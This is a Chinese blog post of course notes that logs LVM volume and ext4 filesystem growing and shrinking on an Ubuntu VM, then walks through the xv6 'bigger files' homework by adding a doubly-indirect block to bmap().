<h5 id="在lv00-中创建文件系统并装载"><a href="#在lv00-中创建文件系统并装载" class="headerlink" title="在lv00 中创建文件系统并装载"></a>在lv00 中创建文件系统并装载</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo mkfs.ext4 /dev/vg00/lv00</span><br><span class="line">mke2fs 1.42.13 (17-May-2015)</span><br><span class="line">Creating filesystem with 2621440 4k blocks and 655360 inodes</span><br><span class="line">Filesystem UUID: 0cb50d90-490e-4413-b702-1187b48d10fc</span><br><span class="line">Superblock backups stored on blocks: </span><br><span class="line">	32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632</span><br><span class="line"></span><br><span class="line">Allocating group tables: 完成                            </span><br><span class="line">正在写入inode表: 完成                            </span><br><span class="line">Creating journal (32768 blocks): 完成</span><br><span class="line">Writing superblocks and filesystem accounting information: 完成 </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS$ sudo mkdir data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS$ sudo mount /dev/vg00/lv00 data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls</span><br><span class="line">lost+found</span><br></pre></td></tr></table></figure>

<p>我将文件系统挂在了 <code>OS/data/</code> 这个文件夹中.</p>
<h5 id="在文件系统中创建一个-8G-的大文件"><a href="#在文件系统中创建一个-8G-的大文件" class="headerlink" title="在文件系统中创建一个 8G 的大文件"></a>在文件系统中创建一个 8G 的大文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo dd <span class="keyword">if</span>=/dev/zero of=/home/yjn/OS/data/bigfile1 bs=1M count=8192</span><br><span class="line">记录了8192+0 的读入</span><br><span class="line">记录了8192+0 的写出</span><br><span class="line">8589934592 bytes (8.6 GB, 8.0 GiB) copied, 12.1378 s, 708 MB/s</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls -lh</span><br><span class="line">总用量 8.1G</span><br><span class="line">-rw-r--r-- 1 root root 8.0G 10月  3 18:29 bigfile1</span><br><span class="line">drwx------ 2 root root  16K 10月  3 18:24 lost+found</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">udev                   1.5G     0  1.5G    0% /dev</span><br><span class="line">tmpfs                  300M  8.9M  291M    3% /run</span><br><span class="line">/dev/sda1               17G  4.6G   12G   30% /</span><br><span class="line">tmpfs                  1.5G  132K  1.5G    1% /dev/shm</span><br><span class="line">tmpfs                  5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs                  1.5G     0  1.5G    0% /sys/fs/cgroup</span><br><span class="line">tmpfs                  300M   40K  300M    1% /run/user/1000</span><br><span class="line">/dev/mapper/vg00-lv00  9.8G  8.1G  1.2G   88% /home/yjn/OS/data</span><br></pre></td></tr></table></figure>

<h5 id="扩大lv-逻辑卷-和fs-文件系统"><a href="#扩大lv-逻辑卷-和fs-文件系统" class="headerlink" title="扩大lv(逻辑卷)和fs(文件系统)"></a>扩大lv(逻辑卷)和fs(文件系统)</h5><p>假如现在又要一个大文件bigfile2, 大小为3G, 文件系统不够大了, 需要扩大lv 和 fs.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo lvextend -L 12G /dev/vg00/lv00</span><br><span class="line">  Size of logical volume vg00/lv00 changed from 10.00 GiB (2560 extents) to 12.00 GiB (3072 extents).</span><br><span class="line">  Logical volume vg00/lv00 successfully resized.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo resize2fs /dev/vg00/lv00</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">Filesystem at /dev/vg00/lv00 is mounted on /home/yjn/OS/data; on-line resizing required</span><br><span class="line">old_desc_blocks = 1, new_desc_blocks = 1</span><br><span class="line">The filesystem on /dev/vg00/lv00 is now 3145728 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">udev                   1.5G     0  1.5G    0% /dev</span><br><span class="line">tmpfs                  300M  8.9M  291M    3% /run</span><br><span class="line">/dev/sda1               17G  4.6G   12G   30% /</span><br><span class="line">tmpfs                  1.5G  132K  1.5G    1% /dev/shm</span><br><span class="line">tmpfs                  5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs                  1.5G     0  1.5G    0% /sys/fs/cgroup</span><br><span class="line">tmpfs                  300M   40K  300M    1% /run/user/1000</span><br><span class="line">/dev/mapper/vg00-lv00   12G  8.1G  3.1G   73% /home/yjn/OS/data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo dd <span class="keyword">if</span>=/dev/zero of=bigfile2 bs=1M count=3096</span><br><span class="line">记录了3096+0 的读入</span><br><span class="line">记录了3096+0 的写出</span><br><span class="line">3246391296 bytes (3.2 GB, 3.0 GiB) copied, 1.92041 s, 1.7 GB/s</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls -lh</span><br><span class="line">总用量 12G</span><br><span class="line">-rw-r--r-- 1 root root 8.0G 10月  3 18:29 bigfile1</span><br><span class="line">-rw-r--r-- 1 root root 3.1G 10月  3 18:34 bigfile2</span><br><span class="line">drwx------ 2 root root  16K 10月  3 18:24 lost+found</span><br></pre></td></tr></table></figure>

<h5 id="扩大pv-物理卷"><a href="#扩大pv-物理卷" class="headerlink" title="扩大pv(物理卷)"></a>扩大pv(物理卷)</h5><p>假如又要在放一个文件bigfile3, 大小为3G, 那么, pv中的剩余空间也不够了. 需要先扩pv, 再扩lv 和 fs.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo pvcreate /dev/sdb5</span><br><span class="line">  Physical volume <span class="string">"/dev/sdb5"</span> successfully created.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo vgextend vg00 /dev/sdb5</span><br><span class="line">  Volume group <span class="string">"vg00"</span> successfully extended</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo vgs</span><br><span class="line">  VG   <span class="comment">#PV #LV #SN Attr   VSize   VFree </span></span><br><span class="line">  vg00   3   1   0 wz--n- &lt;15.99g &lt;3.99g</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo lvextend -L 15.5G /dev/vg00/lv00</span><br><span class="line">  Size of logical volume vg00/lv00 changed from 12.00 GiB (3072 extents) to 15.50 GiB (3968 extents).</span><br><span class="line">  Logical volume vg00/lv00 successfully resized.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo resize2fs /dev/vg00/lv00</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">Filesystem at /dev/vg00/lv00 is mounted on /home/yjn/OS/data; on-line resizing required</span><br><span class="line">old_desc_blocks = 1, new_desc_blocks = 1</span><br><span class="line">The filesystem on /dev/vg00/lv00 is now 4063232 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">udev                   1.5G     0  1.5G    0% /dev</span><br><span class="line">tmpfs                  300M  8.9M  291M    3% /run</span><br><span class="line">/dev/sda1               17G  4.6G   12G   30% /</span><br><span class="line">tmpfs                  1.5G  132K  1.5G    1% /dev/shm</span><br><span class="line">tmpfs                  5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs                  1.5G     0  1.5G    0% /sys/fs/cgroup</span><br><span class="line">tmpfs                  300M   40K  300M    1% /run/user/1000</span><br><span class="line">/dev/mapper/vg00-lv00   16G   12G  3.4G   77% /home/yjn/OS/data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo dd <span class="keyword">if</span>=/dev/zero of=/home/yjn/OS/data/bigfile3 bs=1M count=3096</span><br><span class="line">记录了3096+0 的读入</span><br><span class="line">记录了3096+0 的写出</span><br><span class="line">3246391296 bytes (3.2 GB, 3.0 GiB) copied, 2.03317 s, 1.6 GB/s</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls -lh</span><br><span class="line">总用量 15G</span><br><span class="line">-rw-r--r-- 1 root root 8.0G 10月  3 18:29 bigfile1</span><br><span class="line">-rw-r--r-- 1 root root 3.1G 10月  3 18:34 bigfile2</span><br><span class="line">-rw-r--r-- 1 root root 3.1G 10月  3 18:42 bigfile3</span><br><span class="line">drwx------ 2 root root  16K 10月  3 18:24 lost+found</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h ../data/</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/mapper/vg00-lv00   16G   15G  313M   98% /home/yjn/OS/data</span><br></pre></td></tr></table></figure>

<h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>我们使用了由 sdb5(3GB), sdb6(&lt;3GB), sdc(10GB) 组成的卷组 vg00, 大小为 &lt;16GB.</p>
<p>在其中创建了一个大小为15.5GB的逻辑卷lv00, 此逻辑卷中创建了大小为15.5GB大小的文件系统, 并存放了 bigfile1(8G), bigfile2(3G), bigfile3(3G) 共14G的数据的三个大文件. </p>
<p>经测试, 文件系统随时可以扩大.</p>
<h4 id="缩小文件系统和相关的逻辑卷管理"><a href="#缩小文件系统和相关的逻辑卷管理" class="headerlink" title="缩小文件系统和相关的逻辑卷管理"></a>缩小文件系统和相关的逻辑卷管理</h4><h5 id="删除文件-卸载文件系统"><a href="#删除文件-卸载文件系统" class="headerlink" title="删除文件, 卸载文件系统"></a>删除文件, 卸载文件系统</h5><p>删除bigfile2, bigfile3, unmount文件系统, 为缩小文件系统做准备.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo rm bigfile2 bigfile3</span><br><span class="line">[sudo] yjn 的密码： </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls</span><br><span class="line">bigfile1  lost+found</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ <span class="built_in">cd</span> </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo umount /home/yjn/OS/data </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo e2fsck -f /dev/vg00/lv00 </span><br><span class="line">e2fsck 1.42.13 (17-May-2015)</span><br><span class="line">第一步: 检查inode,块,和大小</span><br><span class="line">第二步: 检查目录结构</span><br><span class="line">第3步: 检查目录连接性</span><br><span class="line">Pass 4: Checking reference counts</span><br><span class="line">第5步: 检查簇概要信息</span><br><span class="line">/dev/vg00/lv00: 12/1015808 files (0.0% non-contiguous), 2200073/4063232 blocks</span><br></pre></td></tr></table></figure>

<h5 id="缩小文件系统以及逻辑卷"><a href="#缩小文件系统以及逻辑卷" class="headerlink" title="缩小文件系统以及逻辑卷"></a>缩小文件系统以及逻辑卷</h5><p>缩小文件系统时, 我再次遇到了问题 :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~$ sudo resize2fs /dev/vg00/lv00 10G</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">resize2fs: New size smaller than minimum (2660232)</span><br></pre></td></tr></table></figure>


<p>我也头一次听说原来文件系统是有最小值的.</p>
<p>那么, 根据它的最小值提示, 经过计算应约为10.14G大小.</p>
<p>在使用 resize2fs 工具时可以加上选项 -M, 就会将文件系统直接缩小到最小值.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~$ sudo resize2fs -M /dev/vg00/lv00</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">Resizing the filesystem on /dev/vg00/lv00 to 2660232 (4k) blocks.</span><br><span class="line">The filesystem on /dev/vg00/lv00 is now 2660232 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo lvreduce -L 11G /dev/vg00/lv00</span><br><span class="line">  WARNING: Reducing active logical volume to 11.00 GiB.</span><br><span class="line">  THIS MAY DESTROY YOUR DATA (filesystem etc.)</span><br><span class="line">Do you really want to reduce vg00/lv00? [y/n]: y</span><br><span class="line">  Size of logical volume vg00/lv00 changed from 15.50 GiB (3968 extents) to 11.00 GiB (2816 extents).</span><br><span class="line">  Logical volume vg00/lv00 successfully resized.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo mount /dev/vg00/lv00 /home/yjn/OS/data/</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ df -h /home/yjn/OS/data/</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/mapper/vg00-lv00  9.9G  8.1G  1.4G   86% /home/yjn/OS/data</span><br><span class="line">yjn@yjn-virtual-machine:~$</span><br></pre></td></tr></table></figure>

<h3 id="bigger-files-for-xv6"><a href="#bigger-files-for-xv6" class="headerlink" title="bigger files for xv6"></a>bigger files for xv6</h3><p><a href="https://pdos.csail.mit.edu/6.828/2018/homework/xv6-big-files.html" target="_blank" rel="noopener">MIT 作业要求</a></p>
<h4 id="关于实验的一些概括性描述"><a href="#关于实验的一些概括性描述" class="headerlink" title="关于实验的一些概括性描述"></a>关于实验的一些概括性描述</h4><ul>
<li>实验目标 : 增加 xv6 文件的最大大小由约 70kB 到约 8.5MB.</li>
<li>实验环境 : Ubuntu 16.04 TLS</li>
<li>大体思路 :<br>xv6文件最大大小为 70KB 的原因是其 inode 包含12个 “直接” 指针和一个 “单一间接” 指针.<br>而xv6的每个数据块为 512B, 所以间接指针指向了共 512/4 = 128 个二级指针. 这样就总共有 128 + 12 = 140 个指针.<br>又因为每个指针都指向了一个512B大小的数据块. 所以就有 140 * 512 = 71680 B = 70KB 大小的文件.<br>那么要怎么实现增大最大大小呢?<br>只需要修改 <code>fs.c</code> 这个文件中的<code>bmap()</code>, 来实现原来的第十二个指针由直接指针改成一级间接指针, 原来的第十三个指针由一级间接指针改成二级间接指针.<br>这样, 指针的总数就是 11 + 128 + 128*128 = 16523 个, 它们指向的数据块的总大小就是 16523 * 512 = 8459776 B = 8.4 MB</li>
</ul>
<h4 id="安装-“big-工具”"><a href="#安装-“big-工具”" class="headerlink" title="安装 “big 工具”"></a>安装 “big 工具”</h4><p>在这次实验中, 需要一个能验证文件大小的方法. 所以这里需要做一些前期工作.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/preliminaries.png" alt title class>
                <p></p>
            </figure>

<ol>
<li><p>在 <code>Makefile</code> 中修改<code>CPUS := 2</code> 为 <code>CPUS := 1</code>, 并在<code>QEMUOPTS</code>的前一行加入<code>QEMUEXTRA = -snapshot</code>.</p>
</li>
<li><p>修改 <code>param.h</code> 中的参数<code>FSSIZE</code>为<br><code>#define FSSIZE       20000  // size of file system in blocks</code></p>
</li>
<li><p>下载 <a href="https://pdos.csail.mit.edu/6.828/2018/homework/big.c" target="_blank" rel="noopener">big.c</a> 至 xv6 目录, 并在 Makefile 文件的 UPROGS 列表的末尾加入<code>_big\</code>.</p>
</li>
<li><p>在 xv6 目录输入 <code>make qemu</code> 编译并运行 xv6. 输入 big ,若显示140个blocks则表明成功.</p>
</li>
</ol>
<h4 id="分析原fs-c文件中的代码"><a href="#分析原fs-c文件中的代码" class="headerlink" title="分析原fs.c文件中的代码"></a>分析原<code>fs.c文件</code>中的代码</h4><p>要想在原xv6的基础修改并实现我们的功能, 必须要先读懂原来的代码.</p>
<p>头一次发现 C语言 的代码是如此晦涩难懂.</p>
<p>这里先附上<code>fs.c</code>中的<code>bmap()</code>的代码以及我的注释.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bmap() 返回 第 bn 个数据块的位置</span></span><br><span class="line"><span class="keyword">static</span> uint </span><br><span class="line">bmap(struct inode *ip, uint bn)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ip 是inode * 实例, 也就是我们将要读取的文件的inode指针</span></span><br><span class="line">  </span><br><span class="line">  uint addr, *a;  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bp</span>;</span></span><br><span class="line">  <span class="comment">// 这里的 NDIRECT = 12, 也就是直接指针的个数.</span></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NDIRECT)&#123;</span><br><span class="line">    <span class="comment">// 如果 bn &lt; NDIRECT, 说明查询直接指针所指向的数据块.</span></span><br><span class="line">    <span class="comment">// 因为 是直接指针, 所以指针是被保存在inode中的, 所以可以通过inode *ip直接访问.</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[bn]) == <span class="number">0</span>)</span><br><span class="line">      <span class="comment">// dev 是 inode 中保存的设备的号码, 我估计应该是磁盘(储存设备)的设备代码)</span></span><br><span class="line">      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bn -= NDIRECT;</span><br><span class="line">  <span class="comment">// NINDIRECT = BSIZE / sizeof(uint);</span></span><br><span class="line">  <span class="comment">// BSIZE = 512;</span></span><br><span class="line">  <span class="comment">// 所以 NINDIRECT = 512 / 4 = 128</span></span><br><span class="line">  <span class="comment">// 在结合之前的 bn -= NDIRECT, 此时的bn 含义成了一级间接指针的个数</span></span><br><span class="line">  <span class="comment">// 只要 bn &lt; NINDIRECT , 即可读取.</span></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NINDIRECT)&#123;</span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT]) == <span class="number">0</span>) </span><br><span class="line">      <span class="comment">// 如果 间接指针是空的, 我们就给它分配一个.</span></span><br><span class="line">      ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="comment">// bp 是缓冲变量, 相当于第13个指针的内容.</span></span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    <span class="comment">// a 是 间接指针所指向的地址的数组.</span></span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">// 根据bmap()函数的意义, 我们只读取a[bn]即可.</span></span><br><span class="line">      a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    brelse(bp);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// bn &gt;= NINDIRECT, 已经超过最大文件大小了.</span></span><br><span class="line">  </span><br><span class="line">  panic(<span class="string">"bmap: out of range"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过漫长的阅读, 基本确定了这个函数的作用是返回第 bn 个数据块的地址. </p>
<p>其中的两个if分别代表读取直接指针指向的数据块和间接指针指向数据块的地址的两种情况.</p>
<p>如果这两种情况都不满足, 就说明文件过大而执行最后的报错语句.</p>
<h4 id="重写-bmap-函数"><a href="#重写-bmap-函数" class="headerlink" title="重写 bmap()函数"></a>重写 <code>bmap()</code>函数</h4><p>其实如果刚才的代码看懂了的话, 下面的工作就是照葫芦画瓢, 很简单.</p>
<p>我也分情况分别贴出代码.</p>
<ul>
<li>访问直接指针的数据块时.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(bn &lt; NDIRECT)&#123;  <span class="comment">// 在fs.h中将这里修改为 11</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[bn]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这是最简单的情况, 只是将常量修改了.</p>
<ul>
<li>访问一级指针所指向的数据块时<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bn -= NDIRECT;</span><br><span class="line"><span class="keyword">if</span>(bn &lt; NINDIRECT)&#123;</span><br><span class="line">  <span class="comment">// Load indirect block, allocating if necessary.</span></span><br><span class="line">  <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT]) == <span class="number">0</span>)</span><br><span class="line">    ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">  bp = bread(ip-&gt;dev, addr);</span><br><span class="line">  a = (uint*)bp-&gt;data;</span><br><span class="line">  <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>)&#123;</span><br><span class="line">    a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bp);</span><br><span class="line">  &#125;</span><br><span class="line">  brelse(bp);</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>因为需要修改的常量已经在宏定义中改好了, 这段代码完全不需要改动.</p>
<ul>
<li>访问二级指针指向的数据块时<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bn -= NINDIRECT;</span><br><span class="line"><span class="keyword">if</span>(bn &lt; <span class="number">128</span>*<span class="number">128</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>((addr = ip-&gt;addrs[<span class="number">12</span>]) == <span class="number">0</span>)&#123;</span><br><span class="line">    ip-&gt;addrs[<span class="number">12</span>] = addr = balloc(ip-&gt;dev);</span><br><span class="line">  &#125;</span><br><span class="line">  bp = bread(ip -&gt;dev, addr); <span class="comment">//读出第13个指针的内容.</span></span><br><span class="line">  a = (uint*)bp-&gt;data;</span><br><span class="line">  </span><br><span class="line">  uint aaddr, *aa;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bbp</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((aaddr = a[bn/<span class="number">128</span>]) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//先读第一级间接指针.</span></span><br><span class="line">    a[bn/<span class="number">128</span>] = aaddr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">  bbp = bread(ip-&gt;dev, aaddr);</span><br><span class="line">  aa = (uint*)bbp-&gt;data;</span><br><span class="line">  <span class="keyword">if</span>((aaddr = aa[bn % <span class="number">128</span>]) == <span class="number">0</span>)&#123;</span><br><span class="line">    aa[bn % <span class="number">128</span>] = aaddr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bbp);</span><br><span class="line">  &#125;</span><br><span class="line">  brelse(bbp);</span><br><span class="line">  brelse(bp);</span><br><span class="line">  <span class="keyword">return</span> aaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里才是真正需要我们发挥的地方.</p>
<p>首先还是先将128个一级数据块减去 (为了清晰直观, 我没有使用常量而是128) , </p>
<p>然后判断inode里的第13个指针是否为空, 如果为空就分配一个.</p>
<p>利用 <code>bn / 128</code> 算出 bn 在第几个二级指针中.</p>
<p>再判断这个二级指针是否为空, 如果为空就分配一个.</p>
<p>再利用 <code>bn % 128</code> 算出 bn 再第几个三级指针中, </p>
<p>判断是否为空, 如果为空就为此三级指针分配地址, 最后函数返回的也是此三级指针的值.</p>
